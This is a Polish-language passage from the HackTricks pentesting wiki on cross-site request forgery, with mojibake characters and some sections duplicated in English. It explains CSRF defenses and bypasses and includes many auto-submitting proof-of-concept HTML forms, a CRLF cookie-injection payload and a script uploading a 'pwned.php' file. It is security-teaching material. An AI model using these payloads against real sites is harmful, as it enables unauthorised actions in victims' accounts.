# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriÃ³w GitHub.**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami nagrÃ³d za bÅ‚Ä™dy!

**WglÄ…d w hakerstwo**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo z hakerstwa**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami nagrÃ³d za bÅ‚Ä™dy i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) **i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!**


## WyjaÅ›nienie Cross-Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** to rodzaj podatnoÅ›ci na zabezpieczenia znalezionej w aplikacjach internetowych. UmoÅ¼liwia ona atakujÄ…cym wykonanie dziaÅ‚aÅ„ w imieniu nieÅ›wiadomych uÅ¼ytkownikÃ³w, wykorzystujÄ…c ich uwierzytelnione sesje. Atak jest wykonywany, gdy uÅ¼ytkownik, ktÃ³ry jest zalogowany na platformie ofiary, odwiedza zÅ‚oÅ›liwÄ… witrynÄ™. Ta witryna wywoÅ‚uje nastÄ™pnie Å¼Ä…dania do konta ofiary za pomocÄ… metod takich jak wykonanie JavaScriptu, przesÅ‚anie formularzy lub pobranie obrazÃ³w.

### Wymagania wstÄ™pne dla ataku CSRF
Aby wykorzystaÄ‡ podatnoÅ›Ä‡ CSRF, muszÄ… zostaÄ‡ speÅ‚nione kilka warunkÃ³w:

1. **Zidentyfikuj cennÄ… akcjÄ™**: AtakujÄ…cy musi znaleÅºÄ‡ akcjÄ™, ktÃ³rÄ… warto wykorzystaÄ‡, takÄ… jak zmiana hasÅ‚a uÅ¼ytkownika, adresu e-mail lub podniesienie uprawnieÅ„.
2. **ZarzÄ…dzanie sesjÄ…**: Sesja uÅ¼ytkownika powinna byÄ‡ zarzÄ…dzana wyÅ‚Ä…cznie za pomocÄ… plikÃ³w cookie lub nagÅ‚Ã³wka autoryzacji podstawowej HTTP, poniewaÅ¼ inne nagÅ‚Ã³wki nie mogÄ… byÄ‡ manipulowane w tym celu.
3. **Brak nieprzewidywalnych parametrÃ³w**: Å»Ä…danie nie powinno zawieraÄ‡ nieprzewidywalnych parametrÃ³w, poniewaÅ¼ mogÄ… one uniemoÅ¼liwiÄ‡ atak.

### Obrona przed CSRF
MoÅ¼na zastosowaÄ‡ kilka Å›rodkÃ³w zaradczych, aby chroniÄ‡ siÄ™ przed atakami CSRF:

* [**SameSite cookies**](hacking-with-cookies/#samesite): Ta atrybut zapobiega przesyÅ‚aniu plikÃ³w cookie przez przeglÄ…darkÄ™ wraz z Å¼Ä…daniami miÄ™dzy witrynami. [WiÄ™cej na temat plikÃ³w cookie SameSite](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): Polityka CORS witryny ofiary moÅ¼e wpÅ‚ywaÄ‡ na wykonalnoÅ›Ä‡ ataku, zwÅ‚aszcza jeÅ›li atak wymaga odczytu odpowiedzi z witryny ofiary. [Dowiedz siÄ™ wiÄ™cej o obejÅ›ciu CORS](cors-bypass.md).
* **Weryfikacja uÅ¼ytkownika**: Wymaganie podania hasÅ‚a uÅ¼ytkownika lub rozwiÄ…zanie captcha moÅ¼e potwierdziÄ‡ intencjÄ™ uÅ¼ytkownika.
* **Sprawdzanie nagÅ‚Ã³wkÃ³w Referrer lub Origin**: Sprawdzanie tych nagÅ‚Ã³wkÃ³w moÅ¼e pomÃ³c upewniÄ‡ siÄ™, Å¼e Å¼Ä…dania pochodzÄ… od zaufanych ÅºrÃ³deÅ‚. Jednak staranne tworzenie adresÃ³w URL moÅ¼e obejÅ›Ä‡ sÅ‚abo zaimplementowane sprawdzanie, na przykÅ‚ad:
- UÅ¼ywanie `http://mal.net?orig=http://example.com` (adres URL koÅ„czy siÄ™ zaufanym adresem URL)
- UÅ¼ywanie `http://example.com.mal.net` (adres URL zaczyna siÄ™ od zaufanego adresu URL)
* **Modyfikowanie nazw parametrÃ³w**: Zmiana nazw parametrÃ³w w Å¼Ä…daniach POST lub GET moÅ¼e pomÃ³c w zapobieganiu automatycznym atakom.
* **Tokeny CSRF**: WÅ‚Ä…czenie unikalnego tokenu CSRF w kaÅ¼dej sesji i wymaganie tego tokenu w kolejnych Å¼Ä…daniach moÅ¼e znacznie zmniejszyÄ‡ ryzyko ataku CSRF. SkutecznoÅ›Ä‡ tokenu moÅ¼na zwiÄ™kszyÄ‡ poprzez wymuszenie CORS.

Zrozumienie i wdroÅ¼enie tych obronnych Å›rodkÃ³w jest kluczowe dla utrzymania bezpieczeÅ„stwa i integralnoÅ›ci aplikacji internetowych.

## OminiÄ™cie obron

### Z POST na GET

ByÄ‡ moÅ¼e formularz, ktÃ³ry chcesz wykorzystaÄ‡, jest przygotowany do wysyÅ‚ania **Å¼Ä…dania POST z tokenem CSRF**, ale powinieneÅ› **sprawdziÄ‡**, czy **Å¼Ä…danie GET** jest rÃ³wnieÅ¼ **waÅ¼ne** i czy podczas wysyÅ‚ania Å¼Ä…dania GET **token CSRF jest wciÄ…Å¼ weryfikowany**.

### Brak tokenu

Aplikacje mogÄ… implementowaÄ‡ mechanizm **weryfikacji tokenÃ³w**, gdy sÄ… obecne. Jednak podatnoÅ›Ä‡ pojawia siÄ™, jeÅ›li weryfikacja jest caÅ‚kowicie pomijana, gdy token jest nieobecny. AtakujÄ…cy mogÄ… wykorzystaÄ‡ to, **usuwajÄ…c parametr**, ktÃ³ry przenosi token, nie tylko jego wartoÅ›Ä‡. Pozwala to ominÄ…Ä‡ proces weryfikacji i skutecznie przeprowadziÄ‡ atak Cross-Site Request Forgery (CSRF).

### Token CSRF nie jest powiÄ…zany z sesjÄ… uÅ¼ytkownika

Aplikacje, ktÃ³re **nie wiÄ…Å¼Ä… tokenÃ³w CSRF z sesjami uÅ¼ytkownikÃ³w**, stanowiÄ… znaczne **ryzyko dla bezpieczeÅ„stwa**. Te systemy weryfikujÄ… tokeny w oparciu o **globalny pul** zamiast zapewniaÄ‡, Å¼e kaÅ¼dy token jest powiÄ…zany z sesjÄ… inicjujÄ…cÄ….

Oto, jak atakujÄ…cy wykorzystujÄ… to:

1. **Uwierzytelnij** siÄ™ za pomocÄ… wÅ‚asnego konta.
2. **Uzyskaj waÅ¼ny token CSRF** z globalnego pulu.
3. **UÅ¼yj tego tokenu** w ataku CSRF przeciwko ofierze.

Ta podatnoÅ›Ä‡ pozwala atakujÄ…cym na dokonywanie nieautoryzowanych Å¼Ä…daÅ„ w imieniu ofiary, wykorzystujÄ…c **niewystarczajÄ…cy mechanizm weryfikacji tokenÃ³w** aplikacji.

### OminiÄ™cie metody

JeÅ›li Å¼Ä…danie uÅ¼ywa "**dziwnej**" **metody**, sprawdÅº, czy dziaÅ‚a funkcjonalnoÅ›Ä‡ **zastÄ™powania metody**.
Na przykÅ‚ad, jeÅ›li uÅ¼ywa metody **PUT**, moÅ¼esz sprÃ³bowaÄ‡ uÅ¼yÄ‡ metody **POST** i **wysÅ‚aÄ‡**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

To moÅ¼e rÃ³wnieÅ¼ dziaÅ‚aÄ‡, wysyÅ‚ajÄ…c **parametr \_method wewnÄ…trz Å¼Ä…dania POST** lub uÅ¼ywajÄ…c **nagÅ‚Ã³wkÃ³w**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### OminiÄ™cie niestandardowego tokenu nagÅ‚Ã³wka

JeÅ›li Å¼Ä…danie dodaje **niestandardowy nagÅ‚Ã³wek** z **tokenem** do Å¼Ä…dania jako **metodÄ™ ochrony CSRF**, to:

*
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
ZauwaÅ¼, Å¼e jeÅ›li **token csrf jest powiÄ…zany z ciasteczkiem sesji, ten atak nie zadziaÅ‚a**, poniewaÅ¼ bÄ™dziesz musiaÅ‚ ustawiÄ‡ ofiarze swojÄ… sesjÄ™, a wiÄ™c bÄ™dziesz atakowaÄ‡ siebie.
{% endhint %}

### Zmiana typu zawartoÅ›ci (Content-Type)

Zgodnie z [**tym**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), aby **uniknÄ…Ä‡ Å¼Ä…daÅ„ wstÄ™pnych** przy uÅ¼yciu metody **POST**, dozwolone sÄ… nastÄ™pujÄ…ce wartoÅ›ci Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Jednak zauwaÅ¼, Å¼e **logika serwera moÅ¼e siÄ™ rÃ³Å¼niÄ‡** w zaleÅ¼noÅ›ci od uÅ¼ytego Content-Type, dlatego powinieneÅ› wyprÃ³bowaÄ‡ wymienione wartoÅ›ci oraz inne, takie jak **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

PrzykÅ‚ad (z [tutaj](https://brycec.me/posts/corctf\_2021\_challenges)) wysyÅ‚ania danych JSON jako text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Omijanie Å¼Ä…daÅ„ Preflight dla danych JSON

Przy prÃ³bie wysÅ‚ania danych JSON za pomocÄ… Å¼Ä…dania POST, bezpoÅ›rednie uÅ¼ycie `Content-Type: application/json` w formularzu HTML nie jest moÅ¼liwe. Podobnie, korzystanie z `XMLHttpRequest` do wysyÅ‚ania tego typu zawartoÅ›ci inicjuje Å¼Ä…danie Preflight. Niemniej jednak istniejÄ… strategie, ktÃ³re potencjalnie umoÅ¼liwiajÄ… obejÅ›cie tego ograniczenia i sprawdzenie, czy serwer przetwarza dane JSON niezaleÅ¼nie od Content-Type:

1. **UÅ¼yj alternatywnych typÃ³w zawartoÅ›ci**: Wykorzystaj `Content-Type: text/plain` lub `Content-Type: application/x-www-form-urlencoded`, ustawiajÄ…c `enctype="text/plain"` w formularzu. Ta metoda testuje, czy backend uÅ¼ywa danych bez wzglÄ™du na Content-Type.

2. **Modyfikuj typ zawartoÅ›ci**: Aby uniknÄ…Ä‡ Å¼Ä…dania Preflight, jednoczeÅ›nie zapewniajÄ…c, Å¼e serwer rozpoznaje zawartoÅ›Ä‡ jako JSON, moÅ¼esz wysÅ‚aÄ‡ dane z `Content-Type: text/plain; application/json`. To nie wywoÅ‚uje Å¼Ä…dania Preflight, ale moÅ¼e byÄ‡ poprawnie przetwarzane przez serwer, jeÅ›li jest skonfigurowany do akceptowania `application/json`.

3. **Wykorzystanie pliku SWF Flash**: Mniej popularna, ale moÅ¼liwa metoda obejÅ›cia takich ograniczeÅ„ polega na uÅ¼yciu pliku SWF Flash. Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe informacje na temat tej techniki, zapoznaj siÄ™ z [tym postem](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### OminiÄ™cie sprawdzania Referrer / Origin

**Unikaj nagÅ‚Ã³wka Referrer**

Aplikacje mogÄ… sprawdzaÄ‡ nagÅ‚Ã³wek 'Referer' tylko wtedy, gdy jest obecny. Aby uniemoÅ¼liwiÄ‡ przeglÄ…darce wysÅ‚anie tego nagÅ‚Ã³wka, moÅ¼na uÅ¼yÄ‡ nastÄ™pujÄ…cego znacznika meta w HTML:
```xml
<meta name="referrer" content="never">
```
To zapewnia, Å¼e nagÅ‚Ã³wek 'Referer' jest pomijany, co potencjalnie omija sprawdzanie poprawnoÅ›ci w niektÃ³rych aplikacjach.

**Omijanie wyraÅ¼eÅ„ regularnych**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Aby ustawiÄ‡ nazwÄ™ domeny serwera w adresie URL, ktÃ³ry Referrer ma wysÅ‚aÄ‡ wewnÄ…trz parametrÃ³w, moÅ¼na to zrobiÄ‡:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Metoda obejÅ›cia HEAD**

Pierwsza czÄ™Å›Ä‡ [**tego opisu CTF**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) wyjaÅ›nia, Å¼e [kod ÅºrÃ³dÅ‚owy Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), routera jest ustawiony tak, aby **obsÅ‚ugiwaÄ‡ Å¼Ä…dania HEAD jako Å¼Ä…dania GET** bez ciaÅ‚a odpowiedzi - powszechne obejÅ›cie, ktÃ³re nie jest unikalne dla Oak. Zamiast konkretnego obsÅ‚ugiwania Å¼Ä…daÅ„ HEAD, sÄ… one po prostu **przekazywane do obsÅ‚ugi GET, ale aplikacja usuwa ciaÅ‚o odpowiedzi**.

Dlatego, jeÅ›li Å¼Ä…danie GET jest ograniczone, moÅ¼na po prostu **wysÅ‚aÄ‡ Å¼Ä…danie HEAD, ktÃ³re zostanie przetworzone jako Å¼Ä…danie GET**.

## **PrzykÅ‚ady wykorzystania**

### **Wyciekanie tokenu CSRF**

JeÅ›li jako **obronÄ™** uÅ¼ywany jest **token CSRF**, moÅ¼na sprÃ³bowaÄ‡ go **wyciec** wykorzystujÄ…c podatnoÅ›Ä‡ [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) lub podatnoÅ›Ä‡ [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET za pomocÄ… znacznikÃ³w HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Inne znaczniki HTML5, ktÃ³re moÅ¼na uÅ¼yÄ‡ do automatycznego wysÅ‚ania Å¼Ä…dania GET, to:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Formularz Å¼Ä…dania GET

A GET request is a type of HTTP request that is used to retrieve data from a server. In the context of web applications, a GET request is commonly used when submitting a form. When a user submits a form using the GET method, the form data is appended to the URL as query parameters.

For example, consider the following form:

```html
<form action="/search" method="GET">
  <input type="text" name="query" placeholder="Search...">
  <button type="submit">Search</button>
</form>
```

In this form, when the user enters a search query and clicks the "Search" button, a GET request will be sent to the server with the form data appended to the URL. The resulting URL might look like this:

```
/search?query=example
```

The server can then use the query parameter to process the search query and return the appropriate results.

It's important to note that GET requests should only be used for retrieving data and should not have any side effects on the server. This means that a GET request should not modify any data on the server or have any other unintended consequences.

### Å»Ä…danie GET formularza

Å»Ä…danie GET to rodzaj Å¼Ä…dania HTTP, ktÃ³re sÅ‚uÅ¼y do pobierania danych z serwera. W kontekÅ›cie aplikacji internetowych Å¼Ä…danie GET jest czÄ™sto uÅ¼ywane podczas przesyÅ‚ania formularza. Gdy uÅ¼ytkownik przesyÅ‚a formularz za pomocÄ… metody GET, dane formularza sÄ… doÅ‚Ä…czane do adresu URL jako parametry zapytania.

Na przykÅ‚ad, rozwaÅ¼my nastÄ™pujÄ…cy formularz:

```html
<form action="/search" method="GET">
  <input type="text" name="query" placeholder="Szukaj...">
  <button type="submit">Szukaj</button>
</form>
```

W tym formularzu, gdy uÅ¼ytkownik wpisze zapytanie wyszukiwania i kliknie przycisk "Szukaj", zostanie wysÅ‚ane Å¼Ä…danie GET do serwera z danymi formularza doÅ‚Ä…czonymi do adresu URL. Wynikowy adres URL moÅ¼e wyglÄ…daÄ‡ tak:

```
/search?query=przykÅ‚ad
```

Serwer moÅ¼e nastÄ™pnie uÅ¼yÄ‡ parametru zapytania do przetworzenia zapytania wyszukiwania i zwrÃ³cenia odpowiednich wynikÃ³w.

Warto zauwaÅ¼yÄ‡, Å¼e Å¼Ä…dania GET powinny byÄ‡ uÅ¼ywane tylko do pobierania danych i nie powinny mieÄ‡ Å¼adnych skutkÃ³w ubocznych na serwerze. Oznacza to, Å¼e Å¼Ä…danie GET nie powinno modyfikowaÄ‡ Å¼adnych danych na serwerze ani mieÄ‡ innych niezamierzonych konsekwencji.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Formularz Å¼Ä…dania POST

A form POST request is a type of HTTP request that is used to submit data to a server. It is commonly used in web applications to send data from a user's browser to the server for processing. The data is typically sent as key-value pairs, where the keys represent the names of the form fields and the values represent the user's input.

To make a form POST request, the user fills out a form on a web page and clicks a submit button. The browser then sends an HTTP POST request to the server, including the form data in the request body. The server processes the data and may perform actions based on the submitted values.

Form POST requests are vulnerable to Cross-Site Request Forgery (CSRF) attacks, where an attacker tricks a user into unknowingly submitting a malicious form on a trusted website. To protect against CSRF attacks, web applications can implement measures such as using CSRF tokens or checking the origin of the request.

### Å»Ä…danie POST formularza

Å»Ä…danie POST formularza to rodzaj Å¼Ä…dania HTTP, ktÃ³re sÅ‚uÅ¼y do przesyÅ‚ania danych do serwera. Jest powszechnie stosowane w aplikacjach internetowych do przesyÅ‚ania danych z przeglÄ…darki uÅ¼ytkownika do serwera w celu ich przetworzenia. Dane sÄ… zwykle przesyÅ‚ane jako pary klucz-wartoÅ›Ä‡, gdzie klucze reprezentujÄ… nazwy pÃ³l formularza, a wartoÅ›ci reprezentujÄ… wprowadzone przez uÅ¼ytkownika dane.

Aby wysÅ‚aÄ‡ Å¼Ä…danie POST formularza, uÅ¼ytkownik wypeÅ‚nia formularz na stronie internetowej i kliknie przycisk "WyÅ›lij". PrzeglÄ…darka wysyÅ‚a wtedy Å¼Ä…danie HTTP POST do serwera, wÅ‚Ä…czajÄ…c dane formularza w treÅ›Ä‡ Å¼Ä…dania. Serwer przetwarza dane i moÅ¼e wykonywaÄ‡ dziaÅ‚ania na podstawie przesÅ‚anych wartoÅ›ci.

Å»Ä…dania POST formularza sÄ… podatne na ataki Cross-Site Request Forgery (CSRF), gdzie atakujÄ…cy wprowadza uÅ¼ytkownika w bÅ‚Ä…d, aby nieÅ›wiadomie wysÅ‚aÅ‚ zÅ‚oÅ›liwy formularz na zaufanej stronie internetowej. Aby chroniÄ‡ siÄ™ przed atakami CSRF, aplikacje internetowe mogÄ… zastosowaÄ‡ Å›rodki takie jak uÅ¼ycie tokenÃ³w CSRF lub sprawdzanie pochodzenia Å¼Ä…dania.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Formularz Å¼Ä…dania POST za pomocÄ… iframe

In some cases, attackers can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by using an iframe to submit a form POST request. This technique allows the attacker to trick the victim into unknowingly submitting a malicious request.

W niektÃ³rych przypadkach atakujÄ…cy mogÄ… wykorzystaÄ‡ podatnoÅ›ci na Cross-Site Request Forgery (CSRF), uÅ¼ywajÄ…c iframe do wysÅ‚ania Å¼Ä…dania POST formularza. Ta technika pozwala atakujÄ…cemu wprowadziÄ‡ ofiarÄ™ w bÅ‚Ä…d, aby nieÅ›wiadomie wysÅ‚aÅ‚a zÅ‚oÅ›liwe Å¼Ä…danie.

To perform this attack, the attacker first creates a hidden iframe on a malicious website. The iframe is then loaded with the target website's form, which the attacker has tampered with. The form is pre-filled with the desired malicious values.

Aby przeprowadziÄ‡ ten atak, atakujÄ…cy najpierw tworzy ukryte iframe na zÅ‚oÅ›liwej stronie internetowej. NastÄ™pnie iframe jest Å‚adowane formularzem docelowej witryny, ktÃ³ry atakujÄ…cy zmodyfikowaÅ‚. Formularz jest wstÄ™pnie wypeÅ‚niony Å¼Ä…danymi zÅ‚oÅ›liwymi wartoÅ›ciami.

When the victim visits the malicious website, the hidden iframe automatically submits the form, sending the malicious request to the target website. Since the request originates from the victim's browser, it appears legitimate to the target website.

Kiedy ofiara odwiedza zÅ‚oÅ›liwÄ… stronÄ™ internetowÄ…, ukryte iframe automatycznie wysyÅ‚a formularz, przesyÅ‚ajÄ…c zÅ‚oÅ›liwe Å¼Ä…danie do docelowej witryny. PoniewaÅ¼ Å¼Ä…danie pochodzi z przeglÄ…darki ofiary, wydaje siÄ™ ono autentyczne dla docelowej witryny.

To protect against this type of attack, web developers should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict SameSite cookie policies.

Aby chroniÄ‡ siÄ™ przed tego rodzaju atakiem, programiÅ›ci internetowi powinni zastosowaÄ‡ Å›rodki takie jak uÅ¼ywanie tokenÃ³w anti-CSRF, sprawdzanie pochodzenia Å¼Ä…daÅ„ i wdraÅ¼anie restrykcyjnych polityk plikÃ³w cookie SameSite.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Zapytanie Ajax POST**

Ajax POST request is a type of HTTP request that is sent asynchronously to the server using the Ajax technology. It is commonly used to send data to the server without reloading the entire web page. This type of request is vulnerable to Cross-Site Request Forgery (CSRF) attacks.

Zapytanie Ajax POST to rodzaj Å¼Ä…dania HTTP, ktÃ³re jest wysyÅ‚ane asynchronicznie do serwera za pomocÄ… technologii Ajax. Jest powszechnie stosowane do wysyÅ‚ania danych do serwera bez koniecznoÅ›ci ponownego Å‚adowania caÅ‚ej strony internetowej. Ten rodzaj Å¼Ä…dania jest podatny na ataki Cross-Site Request Forgery (CSRF).
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Å¼Ä…danie POST z uÅ¼yciem multipart/form-data

A `multipart/form-data` POST request is commonly used to submit data, especially files, through HTML forms. This type of request allows for the transmission of binary data, such as images or documents, along with other form fields.

To craft a `multipart/form-data` POST request, you need to include the following components:

1. Set the `Content-Type` header to `multipart/form-data`.
2. Use a boundary string to separate the different parts of the request.
3. Include each form field as a separate part, with a `Content-Disposition` header specifying the field name.
4. For file uploads, include the file as a separate part, with a `Content-Disposition` header specifying the field name and the file name.

Here's an example of a `multipart/form-data` POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="username"

john.doe
-----------------------------1234567890
Content-Disposition: form-data; name="profile_picture"; filename="picture.jpg"
Content-Type: image/jpeg

...binary data of the image...
-----------------------------1234567890--
```

Remember to replace `example.com` with the actual target domain and adjust the field names, file names, and binary data accordingly.

By understanding how `multipart/form-data` POST requests work, you can effectively interact with web applications that utilize this form of data submission.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Å¼Ä…danie POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request. This type of request is commonly used for file uploads and form submissions that require binary data.

W tej technice bÄ™dziemy badaÄ‡, jak przeprowadziÄ‡ atak Cross-Site Request Forgery (CSRF) za pomocÄ… Å¼Ä…dania POST multipart/form-data. Ten rodzaj Å¼Ä…dania jest czÄ™sto uÅ¼ywany do przesyÅ‚ania plikÃ³w i wysyÅ‚ania formularzy, ktÃ³re wymagajÄ… danych binarnych.

To execute this attack, we need to create a malicious HTML page that will trick the victim into submitting the CSRF request. The page will contain a form with hidden fields that will automatically submit the request when loaded.

Aby przeprowadziÄ‡ ten atak, musimy stworzyÄ‡ zÅ‚oÅ›liwÄ… stronÄ™ HTML, ktÃ³ra oszuka ofiarÄ™ i spowoduje wysÅ‚anie Å¼Ä…dania CSRF. Strona bÄ™dzie zawieraÄ‡ formularz z ukrytymi polami, ktÃ³re automatycznie wyÅ›lÄ… Å¼Ä…danie po zaÅ‚adowaniu.

Here is an example of the HTML code for the malicious page:

Oto przykÅ‚ad kodu HTML dla zÅ‚oÅ›liwej strony:

```html
<html>
<body>
  <h1>Click the button!</h1>
  <form action="https://example.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="csrf_token" value="attacker_token">
    <input type="file" name="file">
    <input type="submit" value="Upload">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

In this example, the form action points to the target website's upload endpoint. The hidden field "csrf_token" is set to the attacker's token, which will be used to bypass CSRF protection. The file input field allows the attacker to upload a file, and the submit button triggers the automatic submission of the form.

W tym przykÅ‚adzie, atrybut "action" formularza wskazuje na punkt koÅ„cowy przesyÅ‚ania na docelowej stronie internetowej. Ukryte pole "csrf_token" jest ustawione na token atakujÄ…cego, ktÃ³ry bÄ™dzie uÅ¼ywany do ominiÄ™cia ochrony CSRF. Pole "file" pozwala atakujÄ…cemu przesÅ‚aÄ‡ plik, a przycisk "submit" wywoÅ‚uje automatyczne wysÅ‚anie formularza.

When the victim visits the malicious page, the form will be automatically submitted, sending the CSRF request to the target website. If the victim is authenticated on the target website and has the necessary privileges, the request will be processed as if it came from the victim.

Kiedy ofiara odwiedza zÅ‚oÅ›liwÄ… stronÄ™, formularz zostanie automatycznie wysÅ‚any, wysyÅ‚ajÄ…c Å¼Ä…danie CSRF na docelowÄ… stronÄ™ internetowÄ…. JeÅ›li ofiara jest uwierzytelniona na docelowej stronie i ma odpowiednie uprawnienia, Å¼Ä…danie zostanie przetworzone tak, jakby pochodziÅ‚o od ofiary.

It is important to note that this technique may not work if the target website has implemented additional security measures, such as anti-CSRF tokens that are validated on the server-side.

